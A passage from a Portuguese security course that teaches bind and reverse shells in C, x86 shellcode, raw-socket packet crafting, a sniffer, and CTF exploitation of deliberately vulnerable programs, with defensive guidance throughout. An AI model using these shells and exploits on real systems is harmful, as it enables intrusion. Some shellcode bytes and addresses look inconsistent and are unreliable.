    leitura: {
      foco:
        'Releia o Beej de rede com o olhar de segurança: Beej\'s Guide to Network Programming (https://beej.us/guide/bgnet/) — capítulos de socket/bind/connect/accept. Para shellcode e transporte, consulte a Azeria Labs (https://azeria-labs.com/) — seções de shellcode (ARM e x86) e fundação do TCP/IP. Lembre a premissa do curso: rode tudo só em lab (loopback/VM).',
    },
    secoes: [
      {
        titulo: 'O terror que mora nos sockets (e a premissa do laboratório)',
        paragrafos: [
          'Você já viu sockets em T3.08 para escrever clientes/servidores. Aqui o cenário vira segurança: um atacante usa <em>exatamente as mesmas syscalls</em> para criar canais de controle remoto (<strong>shells</strong>) e para forjar/inspccionar tráfego (<strong>raw sockets</strong>). O objetivo é que você reconheça esses padrões no <em>defensivo</em>: entender o que é um bind shell é a mesma coisa que ler um log de conexão suspeita e saber o que procurar.',
          '<strong>Premissa inegociável:</strong> os exemplos abaixo usam <strong>loopback (127.0.0.1)</strong> e rodam apenas dentro do WSL2/VM. Nada de IP externo, nada de produção, nada de redes de terceiros. O código é estruturalmente idêntico ao "real" para fins de estudo — por isso o cuidado redobrado.',
        ],
      },
      {
        titulo: 'Bind shell: o servidor que espera o atacante',
        rotulo: 'bind_shell.c (LAB ONLY)',
        paragrafos: [
          'O <strong>bind shell</strong> abre uma porta e fica esperando uma conexão; a conexão que chega vira a shell. Padrão clássico de metasploits e malware de 2000s. Em lab, o defensor reconhece: um processo "servidor" escutando uma porta alta e inesperada.',
        ],
        codigo: `/* bind_shell.c -- DIDATICO, LAB ONLY (loopback). Compile NO LINUX/WSL:
   gcc -Wall -Wextra bind_shell.c -o bind_shell
   Teste em outro terminal:  nc 127.0.0.1 4444 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
    int serv, cli;
    struct sockaddr_in sa;

    serv = socket(AF_INET, SOCK_STREAM, 0);
    if (serv < 0) { perror("socket"); return 1; }

    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);   /* LAB: so loopback */

    if (bind(serv, (struct sockaddr *)&sa, sizeof sa) < 0) { perror("bind"); return 1; }
    if (listen(serv, 1) < 0) { perror("listen"); return 1; }

    printf("bind shell escutando 127.0.0.1:4444 (lab only)\\n");
    cli = accept(serv, NULL, NULL);
    if (cli < 0) { perror("accept"); return 1; }

    /* redireciona stdin/stdout/stderr para o socket */
    dup2(cli, 0);
    dup2(cli, 1);
    dup2(cli, 2);

    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
    return 1;
}`,
        saida: `$ gcc -Wall -Wextra bind_shell.c -o bind_shell
$ ./bind_shell &
bind shell escutando 127.0.0.1:4444 (lab only)
$ nc 127.0.0.1 4444
whoami
voce
id
uid=1000(voce) gid=1000(voce) groups=...
exit`,
      },
      {
        titulo: 'Reverse shell: o cliente que conecta de volta',
        rotulo: 'reverse_shell.c (LAB ONLY)',
        paragrafos: [
          'O <strong>reverse shell</strong> inverte o fluxo: o alvo <em>conecta de volta</em> a um "listener" controlado pelo operador. Para o defensor é mais difícil de ver (não há porta nova escutando; é uma conexão de saída), por isso firewalls de borda monitoram exatamente conexões de saída estranhas. O padrão <code>socket → connect (trocos) → dup2 (0,1,2) → execve(/bin/sh)</code> é o esqueleto didático que você deve reconhecer em análise de malware.',
        ],
        codigo: `/* reverse_shell.c -- DIDATICO, LAB ONLY (conecta em 127.0.0.1).
   Compile NO LINUX/WSL:  gcc -Wall -Wextra reverse_shell.c -o reverse_shell
   Prenda o listener num segundo terminal:  nc -lvnp 4444   */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
    struct sockaddr_in sa;
    int s;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }

    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);   /* LAB: loopback */

    if (connect(s, (struct sockaddr *)&sa, sizeof sa) < 0) {
        perror("connect");
        return 1;
    }

    dup2(s, 0);   /* stdin  vem do socket */
    dup2(s, 1);   /* stdout vai ao socket */
    dup2(s, 2);   /* stderr vai ao socket */

    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
    perror("execve");
    return 1;
}`,
        saida: `$ nc -lvnp 4444                 # terminal 1
Listening on 0.0.0.0 4444
$ ./reverse_shell                  # terminal 2 (lab)
Connection from 127.0.0.1 ...
$ id                               # shell chegou pelo socket
uid=1000(voce) ...`,
      },
      {
        titulo: 'dup2: a magia de três linhas',
        rotulo: 'dup2 em detalhe',
        paragrafos: [
          'O redirecionamento <code>dup2(s, 0/1/2)</code> duplica o descritor do socket sobre os descritores padrão: a partir daí, tudo que o shell escreve no stdout (descritor 1) sai pela rede, e o que chega da rede entra como stdin (descritor 0). <code>execve</code> substitui o processo pelo <code>/bin/sh</code> <em>sem fechar os descritores</em> — a shell nasce "plugada" no socket. Reconhecer essa sequência (socket + dup2×3 + execve) é a assinatura clássica em binários maliciosos e em shellcode.',
        ],
        codigo: `dup2(s, 0);   /* stdin  <- socket  */
dup2(s, 1);   /* stdout -> socket  */
dup2(s, 2);   /* stderr -> socket  */
execve("/bin/sh", argv, NULL);`,
      },
      {
        titulo: 'Shellcode de bind e reverse: payloads de referência',
        rotulo: 'shellcode x86_32 de referencia',
        paragrafos: [
          'Os blocos de instruções equivalentes, prontos como bytes (x86-32, porta <strong>4444</strong>; o reverse conecta em <strong>127.0.0.1</strong>). O bind faz socket→bind→listen→accept→dup2×3→execve; o reverse faz socket→connect→dup2×3→execve. <strong>Caveat honesto:</strong> estes são payloads clássicos de referência — no seu lab, encapsule-os num runner 32-bit (como o módulo 05, com execstack) e valide que respondem; se algum byte divergir na sua distro, ajuste conforme os sockets C deste módulo (que são a fonte de verdade didática). Nunca use sem ambiente isolado.',
        ],
        codigo: `/* BIND SHELL  x86/32  porta 4444  (referencia, lab only)
   \\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x43\\x53\\x89\\xe1\\xb0\\x66\\xcd\\x80
   \\x95\\x52\\x68\\x11\\x5c\\x11\\x05\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\
   \\x55\\x89\\xe1\\xb0\\x66\\xcd\\x80\\xb0\\x66\\xcd\\x80\\x52\\x52\\x55\\
   \\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\x6a\\x3f\\x58\\xcd\\x80
   \\x49\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\
   \\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80

/* REVERSE SHELL x86/32 porta 4444 -> 127.0.0.1 (referencia, lab only)
   \\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x6a\\x66\\x89\\xe1\\x89\\xc7\\xcd\\x80
   \\x89\\xc3\\x31\\xc9\\x6a\\x66\\x58\\x89\\xe1\\xcd\\x80
   \\x66\\x68\\x11\\x5c\\x68\\x7f\\x00\\x00\\x01\\x6a\\x10\\x51\\x53\\x56
   \\x31\\xc0\\x6a\\x66\\x58\\x89\\xe1\\xcd\\x80
   \\x31\\xc9\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x83\\xf9\\x04\\x75\\xf4
   \\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3
   \\x51\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80`,
      },
      {
        titulo: 'Packet crafting: um ICMP ECHO manual (raw socket)',
        rotulo: 'ping_raw.c (root)',
        paragrafos: [
          '<strong>Raw sockets</strong> deixam o processo montar cabeçalhos e enviar pacotes com o formato que quiser (requer root: <code>sudo</code>). Este exemplo constrói um ICMP echo do zero e o envia para o alvo — o "hello world" do packet crafting, sem tocar em <code>ping</code>. Em defesa: forjar pacotes é pré-requisito para entender IDS, spoofing e o que um honeypot registra.',
        ],
        codigo: `/* ping_raw.c -- ICMP echo manual via socket RAW (neces. root, LAB).
   gcc -Wall -Wextra ping_raw.c -o ping_raw   (NO LINUX/WSL)
   sudo ./ping_raw    (raw socket exige root no Linux) */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static unsigned short checksum(void *buf, size_t n)
{
    unsigned short *p = buf;
    unsigned int soma = 0;
    while (n > 1) { soma += *p++; n -= 2; }
    if (n) soma += *(unsigned char *)p;
    soma = (soma >> 16) + (soma & 0xffff);
    soma += (soma >> 16);
    return (unsigned short)~soma;
}

int main(void)
{
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) { perror("socket (raw precisa de root)"); return 1; }

    char pacote[64];
    memset(pacote, 0, sizeof pacote);

    struct icmphdr *icmp = (struct icmphdr *)pacote;
    icmp->type = ICMP_ECHO;                 /* 8 */
    icmp->code = 0;
    icmp->un.echo.id = htons(1);
    icmp->un.echo.sequence = htons(1);
    icmp->checksum = checksum(pacote, sizeof pacote);

    struct sockaddr_in alvo;
    memset(&alvo, 0, sizeof alvo);
    alvo.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &alvo.sin_addr);

    sendto(s, pacote, sizeof pacote, 0,
           (struct sockaddr *)&alvo, sizeof alvo);
    printf("ICMP echo (64 bytes ICMP) enviado a 127.0.0.1\\n");
    close(s);
    return 0;
}`,
        saida: `$ sudo ./ping_raw
ICMP echo (64 bytes ICMP) enviado a 127.0.0.1
# confira a chegada no lado do sniffer (proxima secao) ou com tcpdump -i lo icmp.`,
      },
      {
        titulo: 'Sniffer: ler Ethernet/IP/TCP de quem passa',
        rotulo: 'sniffer.c (root, LAB)',
        paragrafos: [
          'Um <strong>sniffer</strong> usa socket raw passivo (<code>SOCK_RAW, IPPROTO_TCP</code>) para <em>receber</em> cópias dos pacotes que o kernel vê, e imprime endereço:porta origem/destino de cada TCP. Para ler cabeçalho Ethernet de verdade usaríamos <code>SOCK_RAW, htons(ETH_P_ALL)</code> (interface) — aqui priorizamos IP/TCP que é o suficiente para o padrão de estudo. <strong>Só em lab/loopback.</strong>',
        ],
        codigo: `/* sniffer.c -- le pacotes TCP do sistema (LAB, precisa de root).
   gcc -Wall -Wextra sniffer.c -o sniffer   (NO LINUX/WSL)
   sudo ./sniffer                            (root)
   Em outro terminal, gere trafego: nc 127.0.0.1 4444 (loopback). */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

int main(void)
{
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) { perror("socket (root? linux?)"); return 1; }

    unsigned char buf[65536];
    for (int i = 0; i < 8; i++) {           /* le 8 pacotes e para */
        ssize_t n = recv(s, buf, sizeof buf, 0);
        if (n < 0) { perror("recv"); break; }

        struct iphdr *ip = (struct iphdr *)buf;
        struct tcphdr *tcp = (struct tcphdr *)(buf + ip->ihl * 4);
        char saddr[INET_ADDRSTRLEN], daddr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &ip->saddr, saddr, sizeof saddr);
        inet_ntop(AF_INET, &ip->daddr, daddr, sizeof daddr);
        printf("%s:%u -> %s:%u (bytes %zd, flags %s%s)\\n",
               saddr, ntohs(tcp->source),
               daddr, ntohs(tcp->dest), n,
               tcp->syn ? "SYN " : "", tcp->ack ? "ACK" : "");
    }
    close(s);
    return 0;
}`,
        saida: `$ sudo ./sniffer &
$ nc 127.0.0.1 4444 < /dev/null
127.0.0.1:37614 -> 127.0.0.1:4444 (bytes 62, flags SYN )
127.0.0.1:4444 -> 127.0.0.1:37614 (bytes 60, flags SYN ACK)
127.0.0.1:37614 -> 127.0.0.1:4444 (bytes 60, flags ACK)`,
      },
      {
        titulo: 'Detecção e segurança de rede (o lado defensivo do tráfego)',
        paragrafos: [
          'Entender o tráfego é metade da detecção:',
        ],
        lista: [
          '<strong>Conexões de saída inesperadas</strong> (reverse shells) — proxys/firewalls de borda monitoram exatamente "processo nosso conversando com destino estranho"; em Linux, <code>ss -tpn</code> e <code>lsof -i</code> mostram quem fala com quem.',
          '<strong>Portas altas escutando</strong> (bind shells) — audite com <code>ss -tlnp</code>; porta aberta sem dono documentado é suspeita.',
          '<strong>Raw sockets em processos</strong> — <code>ss</code>/<code>lsof</code> indicam; root + raw socket não visto em inventário = candidato a sniffing.',
          '<strong>Criptografia</strong>: tráfego legítimo é TLS (<code>tcpdump -w cap.pcap</code> + Wireshark); payload de shell costuma vir em texto claro no lab — por isso malware moderno "fala" com cripto e usando canais mimetizando HTTP/TLS. A defesa inclui visibilidade (captura + análise) e não confiar em "parece HTTP".',
          '<strong>Firewall/IDS</strong>: regras de zona (nunca plataforma da lab na rede de produção), <em>e ingressos de saída</em> para o perímetro. O lab usa loopback justamente para nada escapar da máquina.',
        ],
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Mapeie o tráfego do seu sistema: faça inventário de portas escutando (<code>ss -tlnp</code>), conexões ativas (<code>ss -tpn</code>) e processos com raw sockets ou <code>/proc</code> suspeito.',
          'Bloqueie saída não esperada no firewall/perímetro — reverse shell só funciona se a saída existe.',
          'Isolar segmentos: servidor crítico nunca "conversa" livremente; microssegmentação limita o raio de um bind/reverse.',
          'Criptografe em trânsito e valide certificados/pinning — tráfego claro é capturável por qualquer pega na rede.',
          'Mantenha IDS/visibilidade: capture (tcpdump/Wireshark) e correlacione — um "ECP explicável" do lab agora é o "fluxo destoante" que você reconhecerá em produção.',
          'Rode estes exemplos SOMENTE em loopback/VM; se precisar demonstrar para terceiros, use rede isolada com consentimento por escrito.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 2,
        enunciado:
          'Compile e rode o <code>bind_shell</code> em loopback, conecte com <code>nc 127.0.0.1 4444</code> e execute <code>whoami; id; pwd</code>. Explique o papel das chamadas socket, bind, listen, accept, dup2 e execve nesse fluxo.',
        dica: 'Trace a sequência como um diagrama: cada syscall é um passo do "protocolo" do servidor. As três dup2 são o redirecionamento.',
        solucao: `$ gcc -Wall -Wextra bind_shell.c -o bind_shell
$ ./bind_shell &
$ nc 127.0.0.1 4444
whoami
voce
id
uid=1000(voce) ...
pwd
/home/voce/labs/4.09
exit`,
        solucao_obs: 'socket(2) cria o descritor; bind amarra o endereço/porta; listen declara "serviço"; accept entrega o descritor do cliente; dup2 reamarra os fds padrão; execve vira a shell reutilizando os descritores.',
      },
      {
        nivel: 2,
        enunciado:
          'Refaça com o <code>reverse_shell</code>: terminal 1 roda <code>nc -lvnp 4444</code>; terminal 2 (mesmo lab) roda o reverse. Quando a conexão aparece, digite <code>hostname; whoami</code>. Depois troque o sufixo: conecte para um IP/porta ERRADO e mostre a mensagem de erro do connect.',
        dica: 'O nc é o "listener"; o reverse é o "cliente". Para o erro, use uma porta ocupada ou IP x.x.x.x sem dono.',
        solucao: `$ nc -lvnp 4444   # terminal 1
Listening on 0.0.0.0 4444
$ ./reverse_shell  # terminal 2
Connection from 127.0.0.1 56120
hostname
NC-LAB4
whoami
voce

# Caso o connect falhe:
$ ./reverse_shell  (com 4567 sem listener)
connect: Connection refused`,
      },
      {
        nivel: 3,
        enunciado:
          'Rode o <code>sniffer</code> com root e, em paralelo, o <code>ping_raw</code>. Identifique no output do sniffer se o ICMP aparece (confira com <code>type</code> no parser) e depois gere um TCP arbitrário (nc) e confirme que SYN/ACK/portas aparecem. Registre 4 pacotes TCP no output.',
        dica: 'O sniffer só captura TCP (IPPROTO_TCP). Para ver o ICMP manual, acrescente <code>case IPPROTO_ICMP</code> e imprima tipo/código — o exercício é exatamente adicionar esse caso.',
        solucao: `   /* adaptacao didatica (bonus do exercicio): imprimir tambem ICMP */
     case IPPROTO_ICMP: {
        struct icmphdr *icmp = (struct icmphdr *)(buf + ip->ihl * 4);
        printf("ICMP type=%u code=%u\\n", icmp->type, icmp->code);
        break;
     }`,
        solucao_obs: 'Ao rodar sudo ./ping_raw, você verá type=8 (echo request). Isso conecta o packet crafting à recepção.',
      },
    ],
    quiz: [
      {
        pergunta: 'Qual a diferença prática entre bind shell e reverse shell?',
        opcoes: [
          'Bind escuta uma porta (servidor); reverse conecta de volta a um listener (cliente)',
          'Bind usa UDP e reverse usa TCP',
          'Bind roda em Windows e reverse em Linux',
          'Não há diferença',
        ],
        correta: 0,
        explicacao: 'Bind abre porta e espera; reverse inicia a conexão para fora — mais difícil de ver no perímetro.',
      },
      {
        pergunta: 'O que a sequência dup2(s,0); dup2(s,1); dup2(s,2) faz?',
        opcoes: [
          'Redireciona stdin/stdout/stderr para o socket, plugando a shell na rede',
          'Imprime o endereço do socket',
          'Fechar o socket após o exec',
          'Duplica o processo principal',
        ],
        correta: 0,
        explicacao: 'Os fds padrão passam a apontar o socket; depois execve mantém os descritores e a shell nasce conectada.',
      },
      {
        pergunta: 'Por que um firewall de borda monitora conexões de saída inesperadas?',
        opcoes: [
          'Porque reverse shells são exatamente conexões de saída do alvo para um operador externo',
          'Porque toda conexão de saída é ilegal',
          'Para bloquear atualizações',
          'Para cachear navegação',
        ],
        correta: 0,
        explicacao: 'Não há porta nova escutando no alvo; o indicador é o fluxo de saída atípico para destinos não esperados.',
      },
      {
        pergunta: 'O que um raw socket (SOCK_RAW) habilita e o que ele exige?',
        opcoes: [
          'Montar/enviar pacotes com cabeçalhos próprios; requer root no Linux',
          'Enviar pacotes em Ethernet; não requer permissão',
          'Apenas receber sites',
          'Fazer DNS',
        ],
        correta: 0,
        explicacao: 'Raw permite forjar e inspecionar no nível de IP/ICMP/TCP; no Linux exige privilégio de root.',
      },
    ],
    projeto: {
      titulo: 'Demonstração de rede em loopback + guia para o defensor',
      descricao:
        'Monte a pasta <code>~/labs/4.09</code> com: (1) uma demonstração completa rodando — listener nc e reverse_shell conectando, com output capturado dos dois lados; (2) o bind_shell com registro de tcpdump (<code>sudo tcpdump -i lo -w cap.pcap</code>) e uma decodificação mínima mostrando o handshake; (3) o sniffer imprimindo os pacotes do seu próprio teste; (4) um arquivo <code>defensor.md</code> com o "playbook": comandos (ss -tlnp, ss -tpn, lsof -i, tcpdump), o que olhar em cada um e as 3 features que você monitoraria num endpoint para detectar esses padrões.',
      criterios: [
        'reverse_shell + nc funcionando no lab com output dos dois terminais.',
        'bind_shell testado via nc e pacotes capturados com tcpdump/analisados.',
        'sniffer imprimindo TCP do próprio teste (ou do exercício 3).',
        'Playbook defensor.md com comandos e sinais de detecção.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '10',
    titulo: 'Capstone: CTF pwn + auditoria definitiva',
    subtitulo: 'Explorar dois binários de CTF e auditar/corrigir código C real',
    objetivo:
      'Prova final da trilha em dois braços: (1) OFENSIVO — resolver dois desafios de pwn em plataformas éticas (pwn.college "Shellcode Injection" ou Exploit Education "Phoenix stack-series"), escrevendo exploit e um writeup em markdown; (2) DEFENSIVO — auditar dois programas C fornecidos (ctf1.c e ctf2.c), identificar 3+ vulnerabilidades com CWE, linha, impacto e explotabilidade, e propor correções com diff.',
    prerequisitos: 'T4.04–T4.09 (ferramentas, overflow, mitigações, format string, heap, redes)',
    duracao: '~50 min',
    nivel: 'Avançado/Cyber',
    leitura: {
      foco:
        'Use o pwn.college (https://pwn.college/) módulos de programmability/shellcode e o Exploit Education (https://exploit.education/) — série Phoenix (stack-series). Reforce com vídeos do LiveOverflow ("Buffer overflow exploits" e "Format string") e, para a parte defensiva, use o CWE Top 25 (https://cwe.mitre.org/data/definitions/934.html) como checklist na hora de classificar os achados.',
    },
    secoes: [
      {
        titulo: 'A missão, em mapas de duas estradas',
        rotulo: 'visao geral do capstone',
        paragrafos: [
          'Este é o módulo em que tudo converge. Você vai (1) resolver <strong>dois binários reais de CTF</strong> das plataformas éticas indicadas — explorando de verdade, mas dentro do sandbox deles; e (2) auditar <strong>dois binários que eu forneço</strong> (ctf1.c e ctf2.c), encontrando as vulnerabilidades com o vocabulário CWE e propondo correção com diff. A entrega: um diretório <code>~/labs/4.10</code> com dois writeups e um relatório de auditoria.',
          'As plataformas de CTF são espaços <em>projetados</em> para isso: você recebe o binário, o servidor de teste e a permissão escancarada de atacar <em>aquele</em> binário. Nada disso autoriza atacar qualquer outro sistema — a regra ética da trilha continua valendo.',
        ],
      },
      {
        titulo: 'Braço ofensivo: escolha e método',
        rotulo: 'challenges recomendados',
        paragrafos: [
          'Escolha um dos dois pacotes (não precisa fazer os dois):',
        ],
        lista: [
          '<strong>pwn.college — programmability (shellcode injection)</strong>: programas mínimos que lêem shellcode e o executam — variação pura da ideia do módulo 05, com buffer e exec direto. /esté exatamente o repertório que construímos.',
          '<strong>Exploit Education — Phoenix (stack-series)</strong>: binários com overflow clássico, format string e ret2libc, prontos para rodar localmente no seu lab (os mesmos padrões dos módulos 05-07).',
          'Regra da prova: resolva <strong>pelo menos 2 binários</strong> de uma das séries. Sugestão de rota: um overflow simples (ex.: stack-zero/one do Phoenix) + um format string ou ret2libc.',
        ],
      },
      {
        titulo: 'A entrega ofensiva: o writeup',
        rotulo: 'estrutura do writeup',
        paragrafos: [
          'Para cada binário resolvido, um arquivo <code>writeup_<challenge>.md</code> com a anatomia de um writeup profissional:',
        ],
        lista: [
          '<strong>Resumo</strong>: o que o binário faz e qual a classe de bug (com CWE).',
          '<strong>Verificação</strong>: <code>checksec</code> transcrito e interpretado (NX/PIE/canário/RELRO).',
          '<strong>Análise</strong>: desenho da frame/vetor (offset, endereços, leak) com evidências do gdb.',
          '<strong>Exploit</strong>: o payload completo (ou script) e os comandos de execução.',
          '<strong>Prova</strong>: output com a flag/cat do arquivo de flag (nas plataformas) ou shell obtida.',
          '<strong>Defesa</strong>: como você corrigiria aquele bug e quais mitigações faltavam.',
        ],
      },
      {
        titulo: 'Braço defensivo: o método de auditoria',
        rotulo: 'metodo de auditoria',
        paragrafos: [
          'Antes de ler os binários, o método que você vai aplicar (e repetir na vida real):',
        ],
        lista: [
          '1. <strong>Inventário de entrada</strong>: liste todos os pontos onde o programa lê dados externos (argv, stdin, arquivo, rede) — é onde bugs vivem.',
          '2. <strong>Caça de copy/format</strong>: procure gets, strcpy, strcat, sprintf, printf(var).',
          '3. <strong>Caça de aritmética</strong>: tamanhos, índices, subtrações unsigned, off-by-one.',
          '4. <strong>Caça de vida/morte</strong>: malloc/free pareados? ponteiro reaproveitado?',
          '5. <strong>Confirmar com ferramentas</strong>: compilar com sanitizers/valgrind e reproduzir.',
          '6. <strong>Registrar</strong>: cada achado com (a) CWE, (b) linha, (c) impacto, (d) explotabilidade (trivial/média/baixa) e (e) correção proposta.',
        ],
      },
      {
        titulo: 'Binário 1 da auditoria: ctf1.c',
        rotulo: 'ctf1.c (VULNERÁVEL)',
        paragrafos: [
          'Um "terminal"zinho de senha — três vulnerabilidades da nossa trilha num só arquivo. Compile-o e explore você mesmo antes de ver o gabarito.',
        ],
        codigo: `/* ctf1.c -- binario didatico de auditoria (VULNERAVEL).
   Compile NO LINUX/WSL (didatico): 
   gcc -m32 -fno-stack-protector -no-pie -g ctf1.c -o ctf1
   OBS.: em 64-bit (-m64) os offsets mudam; o texto do gabarito
   usa 32-bit. Numeros nao chutados: meca no seu gdb. */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define SENHA "br1ck3d??"

static void painel_admin(void)
{
    printf("FLAG_EDUCACIONAL{nunca-deploye-isto}\\n");
    system("/bin/sh");
}

int main(void)
{
    char senha[32];
    int  permitido = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("== terminal ctf1 ==\\nsenha: ");
    gets(senha);                   /* <-- 1a vunerabilidade */

    if (strcmp(senha, SENHA) == 0)
        permitido = 1;

    if (permitido)
        printf("acesso concedido\\n");
    else
        printf("negado\\n");
    return 0;
}`,
        saida: `$ gcc -m32 -fno-stack-protector -no-pie -g ctf1.c -o ctf1
$ ./ctf1
== terminal ctf1 ==
senha: hehe
negado`,
      },
      {
        titulo: 'Binário 2 da auditoria: ctf2.c',
        rotulo: 'ctf2.c (VULNERÁVEL)',
        paragrafos: [
          'Um "registrador de eventos" com duas fraquezas da trilha. Reproduza o comportamento bugado antes do gabarito.',
        ],
        codigo: `/* ctf2.c -- binario didatico de auditoria (VULNERAVEL).
   Compile NO LINUX/WSL (didatico):
   gcc -m32 -fno-stack-protector -no-pie -g ctf2.c -o ctf2 */
#include <stdio.h>
#include <string.h>

int nivel = 0;   /* nivel de seguranca global */

int main(void)
{
    char evento[512];

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("== terminal ctf2 ==\\ndigite a descricao do evento: ");
    if (fgets(evento, sizeof evento, stdin) == NULL)
        return 1;

    printf("[log] ");
    printf(evento);                  /* <-- vunerabilidade central */

    printf("nivel de seguranca: %s\\n",
           nivel == 0 ? "baixo" : "ELEVADO");
    return 0;
}`,
        saida: `$ gcc -m32 -fno-stack-protector -no-pie -g ctf2.c -o ctf2
$ ./ctf2
== terminal ctf2 ==
digite a descricao do evento: tentativa de login
[log] tentativa de login
nivel de seguranca: baixo`,
      },
      {
        titulo: 'Gabarito ctf1.c: os achados',
        rotulo: 'gabarito ctf1',
        paragrafos: [
          'Tabela do que o auditor (você) deve ter achado; reproduza as provas no lab antes de seguir.',
        ],
        lista: [
          '<strong>CWE-242 (Uso de função inerentemente perigosa) / CWE-121 (stack overflow)</strong> — linha do <code>gets(senha)</code>. Entrada sem limite estoura <code>senha[32]</code>. Impacto: RCE (com a cadeia completa) ou corrupção. Explotabilidade: triviale.',
          '<strong>CWE-287 (Autenticação imprópria)</strong> — o <em>bypass</em>: com 33 bytes (32 de senha + 1 byte <code>1</code>), o <code>permitido</code> — que vive junto na frame — vira não-zero; o <code>if (permitido)</code> concede independentemente da senha. Distinct do overflow do item anterior (duas CWEs para o mesmo gets).',
          '<strong>CWE-119 (Falha de limites de memória)</strong> — pai das duas acima (o vetor em si). Se preferir manter, classifique como CWE-119 + CWE-121 + CWE-287.',
          '<strong>Bônus (ret2win)</strong>: com offset 36 no 32-bit (32 de buffer + 4 do EBP), o payload pode retornar direto para <code>painel_admin</code> — transformando o bug de leitura de flash em código. Prova no gdb.',
        ],
        codigo: `# prova 1: bypass por estouro do permitido (32-bit)
$ python3 -c "print('A'*32 + '\\x01')" | ./ctf1
...
== terminal ctf1 ==
senha: acesso concedido
FLAG_EDUCACIONAL{nunca-deploye-isto}
$ 

# prova 2: ret2win (32-bit) - endereco de painel_admin
$ objdump -t ctf1 | grep painel_admin
000010d0 g F .text  000...           painel_admin
$ python3 -c "import struct,sys;
e=0x4010d0  # se o binario for -no-pie
sys.stdout.buffer.write(b'A'*36 + struct.pack('<I', e))" | ./ctf1`,
      },
      {
        titulo: 'Correções ctf1.c (com diff)',
        rotulo: 'correcao ctf1',
        codigo: `--- ctf1.c (vulneravel)
+++ ctf1.c (corrigido)
@@ main:
-    char senha[32];
-    int  permitido = 0;
+    char senha[64];
+    int  autenticado = 0;
@@ leitura:
-    gets(senha);                          /* CWE-242/121 */
+    if (fgets(senha, sizeof senha, stdin) == NULL)
+        return 1;                         /* nunca confie em gets */
+    senha[strcspn(senha, "\\n")] = '\\0';  /* limpa o \\n final */
@@ decisao:
-    if (strcmp(senha, SENHA) == 0)
-        permitido = 1;
-    if (permitido)
-        printf("acesso concedido\\n");
-    else
-        printf("negado\\n");
+    if (strcmp(senha, SENHA) == 0)
+        autenticado = 1;
+    if (autenticado)
+        printf("acesso concedido\\n");
+    else
+        printf("negado\\n");
@@ simplificar / reduzir superficie:
-    system("/bin/sh");     /* num app real: NAO existe shell sob demanda */
@@ build:
-    gcc -m32 -fno-stack-protector -no-pie ...
+    gcc -O2 -Wall -Wextra -Wformat-security -Werror=format-security \\
+        -fstack-protector-all -pie -z relro -z now ctf1.c -o ctf1_hard`,
      },
      {
        titulo: 'Gabarito ctf2.c: os achados',
        rotulo: 'gabarito ctf2',
        lista: [
          '<strong>CWE-134 (Uncontrolled format string)</strong> — <code>printf(evento)</code>: a entrada vira format; <code>%p/%x</code> vazam pilha/registradores (leak) — o mesmo vetor que alimenta ret2libc do módulo 06.',
          '<strong>CWE-119/CWE-787 (escrita fora dos limites real)</strong> — via <code>%n</code>: escrever no endereço de <code>nivel</code> (global, endereço fixo em -no-pie) e elevar o nível de segurança sem privilégio. A lógica "nivel != 0 → ELEVADO" é a fraqueza de confiança.',
          '<strong>Leak de fingerprint</strong>: o formato livre permite vazar endereços da libc/PIE — informação que (combinada ao overflow em outra parte do sistema) vira exploit completo.',
        ],
        codigo: `# prova (32-bit, -no-pie: endereco de nivel e fixo)
$ nm ctf2 | grep ' nivel'
0804a024 B nivel
$ python3 -c 'import struct,sys
addr=0x0804a024
p=struct.pack("<I", addr) + b"%20u" + b"%5$n"
sys.stdout.buffer.write(p)' | ./ctf2
== terminal ctf2 ==
digite a descricao do evento: [log] <20 espacos>
nivel de seguranca: ELEVADO   # o %n gravou 20+n0 no endereco de nivel`,
      },
      {
        titulo: 'Correções ctf2.c (com diff)',
        rotulo: 'correcao ctf2',
        codigo: `--- ctf2.c (vulneravel)
+++ ctf2.c (corrigido)
@@ output:
-    printf(evento);                      /* CWE-134 */
+    printf("%s", evento);                /* format explicita, sempre  */
@@ estado:
-    int nivel = 0;   /* global: alvo de escrita */
-    if (nivel == 0) printf("nivel: baixo\\n"); else printf("nivel: ELEVADO\\n");
+    int nivel = verifica_status();
